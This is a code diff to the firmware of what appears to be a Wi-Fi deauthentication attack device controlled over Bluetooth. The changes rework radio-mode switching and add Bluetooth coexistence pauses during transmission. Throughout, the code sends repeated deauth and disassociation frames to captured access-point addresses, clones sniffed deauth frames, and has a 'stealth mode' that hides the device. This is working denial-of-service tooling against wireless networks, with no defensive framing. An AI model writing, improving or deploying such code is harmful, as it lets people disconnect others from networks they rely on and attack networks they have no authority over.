@@ -71,13 +71,16 @@ bool executeCommand(String command, String *errOut, bool fromHttp) {
     haltPromiscSniff();
     apEnabled = false;
     bool staOk = enterStaMode("ap off");
+    if (!staOk) {
+      apEnabled = startSoftAP();
+      blePushInfo();
+      blePushStatus();
+      return failCmd(errOut, "Failed to switch radio to STA mode for 'ap off'.");
+    }
+    delay(5);
     blePushInfo();
     blePushStatus();
-    if (staOk) {
-      Serial.println("[INFO] AP + WebUI disabled. BLE-only stealth mode (STA active).");
-    } else {
-      Serial.println("[WARN] AP + WebUI disabled, but STA initialization failed.");
-    }
+    Serial.println("[INFO] AP + WebUI disabled. BLE-only stealth mode (STA active).");
     return true;
   }
   else if (command.equalsIgnoreCase("ap on")) {
@@ -270,6 +273,7 @@ bool executeCommand(String command, String *errOut, bool fromHttp) {
       }
       size_t idx = (size_t)random(0, snap.size());
       uint8_t randChannel = (uint8_t)snap[idx].channel;
+      int prevCh = getCurrentChannelSafe();
       if (wifi_set_channel(randChannel) != RTW_SUCCESS) {
         Serial.print("[WARN] wifi_set_channel(");
         Serial.print(randChannel);
@@ -280,8 +284,17 @@ bool executeCommand(String command, String *errOut, bool fromHttp) {
         return false;
       } else {
         setCurrentChannelSafe(randChannel);
+        refreshBleCoexOnBandSwitch(prevCh, randChannel);
         for (unsigned long j = 0; j < num_send_frames; j++) {
           if (shouldAbortCycle()) break;
+          if (randChannel >= 36 && j > 0 && (j % 32UL == 0UL) && isBleConnectedSafe()) {
+            serviceBleBreathingWindow(65UL, true);
+            if (shouldAbortCycle()) break;
+            if (wifi_set_channel(randChannel) == RTW_SUCCESS) {
+              setCurrentChannelSafe(randChannel);
+              refreshBleCoexOnBandSwitch(WIFI_CHANNEL, randChannel);
+            }
+          }
           uint16_t reason = deauth_reasons[j % num_deauth_reasons];
           wifi_tx_deauth_frame(snap[idx].bssid, dst_mac, reason);
           wifi_tx_disassoc_frame(snap[idx].bssid, dst_mac, disassoc_reasons[j % num_disassoc_reasons]);
@@ -377,33 +390,15 @@ bool executeCommand(String command, String *errOut, bool fromHttp) {
       }
       resetPromiscLogThrottle();
       // Close listening socket cleanly and reuse active STA if already in BLE-only STA mode
-      int wextMode = -1;
-      bool alreadySta = (!apEnabled &&
-                       wlanRuntimeMode == WLAN_MODE_STA &&
-                       wifi_is_up(RTW_STA_INTERFACE) &&
-                       !wifi_is_up(RTW_AP_INTERFACE) &&
-                       wext_get_mode(WLAN0_NAME, &wextMode) == RTW_SUCCESS &&
-                       wextMode == RTW_MODE_INFRA);
-      if (!alreadySta) {
-        prepareRadioForSniff(true);
-        feedWatchdog();
-        if (wifi_on(RTW_MODE_STA) != RTW_SUCCESS) {
-          wlanRuntimeMode = WLAN_MODE_UNINIT;
-          Serial.println("[ERROR] wifi_on(RTW_MODE_STA) failed for deauth_sniff.");
-          if (apEnabled) {
-            startSoftAP();
-          } else {
-            restoreBleCoex(false);
-          }
-          blePushStatus();
-          if (errOut) *errOut = "wifi_on(RTW_MODE_STA) failed";
-          return false;
+      if (!enterStaMode("deauth_sniff")) {
+        Serial.println("[ERROR] enterStaMode failed for deauth_sniff.");
+        if (apEnabled) {
+          startSoftAP();
         }
-        feedWatchdog();
-        wlanRuntimeMode = WLAN_MODE_STA;
+        blePushStatus();
+        if (errOut) *errOut = "wifi_on(RTW_MODE_STA) failed";
+        return false;
       }
-      WiFi.disablePowerSave();
-      restoreBleCoex(!alreadySta);
       resetHopState();
       deauth_sniff_prev_hop = isHopping;
       isHopping = true;
@@ -415,6 +410,7 @@ bool executeCommand(String command, String *errOut, bool fromHttp) {
       // 先置好全部状态位再注册回调，避免首波回调漏检或状态撕裂
       rtw_enter_critical(NULL, NULL);
       currentMode = SNIFF_DEAUTH;
+      promiscPauseForBleCoex = false;
       isSniffing = true;
       deauth_sniff_enabled = true;
       has_sniffed_deauth = false;
@@ -424,6 +420,7 @@ bool executeCommand(String command, String *errOut, bool fromHttp) {
       if (wifi_set_promisc(RTW_PROMISC_ENABLE_2, promisc_callback, 1) != RTW_SUCCESS) {
         rtw_enter_critical(NULL, NULL);
         isSniffing = false;
+        promiscPauseForBleCoex = false;
         deauth_sniff_enabled = false;
         currentMode = SNIFF_STOP;
         isHopping = deauth_sniff_prev_hop;
@@ -435,6 +432,7 @@ bool executeCommand(String command, String *errOut, bool fromHttp) {
         if (errOut) *errOut = "wifi_set_promisc failed";
         return false;
       } else {
+        enforceBleCoexPta(true);
         Serial.println("[INFO] Deauth sniff started - auto-hopping 2.4G/5G to clone deauth frames.");
         bleSendLog("[INFO] Deauth 克隆嗅探已启动 (自动双频跳频监听)");
         blePushStatus();
@@ -462,18 +460,29 @@ bool executeCommand(String command, String *errOut, bool fromHttp) {
         if (!priorityStopPending) {
           emergencyStopRequested = false;
         }
-        if (wifi_set_channel(snap[(size_t)idx].channel) != RTW_SUCCESS) {
+        int targetCh = (int)snap[(size_t)idx].channel;
+        int prevCh = getCurrentChannelSafe();
+        if (wifi_set_channel(targetCh) != RTW_SUCCESS) {
           Serial.print("[WARN] wifi_set_channel(");
-          Serial.print(snap[(size_t)idx].channel);
+          Serial.print(targetCh);
           Serial.println(") failed");
-          bleSendLog("[WARN] Switch CH " + String(snap[(size_t)idx].channel) + " failed");
+          bleSendLog("[WARN] Switch CH " + String(targetCh) + " failed");
           if (errOut) *errOut = "Failed to switch channel";
           blePushStatus();
           return false;
         } else {
-          setCurrentChannelSafe((int)snap[(size_t)idx].channel);
+          setCurrentChannelSafe(targetCh);
+          refreshBleCoexOnBandSwitch(prevCh, targetCh);
           for (unsigned long j = 0; j < num_send_frames; j++) {
             if (shouldAbortCycle()) break;
+            if (targetCh >= 36 && j > 0 && (j % 32UL == 0UL) && isBleConnectedSafe()) {
+              serviceBleBreathingWindow(65UL, true);
+              if (shouldAbortCycle()) break;
+              if (wifi_set_channel(targetCh) == RTW_SUCCESS) {
+                setCurrentChannelSafe(targetCh);
+                refreshBleCoexOnBandSwitch(WIFI_CHANNEL, targetCh);
+              }
+            }
             wifi_tx_deauth_frame(snap[(size_t)idx].bssid, dst_mac, deauth_reasons[j % num_deauth_reasons]);
             wifi_tx_disassoc_frame(snap[(size_t)idx].bssid, dst_mac, disassoc_reasons[j % num_disassoc_reasons]);
             delay(1);
@@ -666,6 +675,7 @@ bool executeCommand(String command, String *errOut, bool fromHttp) {
              FIRMWARE_VERSION, ap_ssid, ble_name, cycle_delay, scan_time, num_send_frames);
     Serial.println(infoMsg);
     blePushInfo();
+    blePushStatus(true);
     return true;
   }
   else if (command.equalsIgnoreCase("help")) {
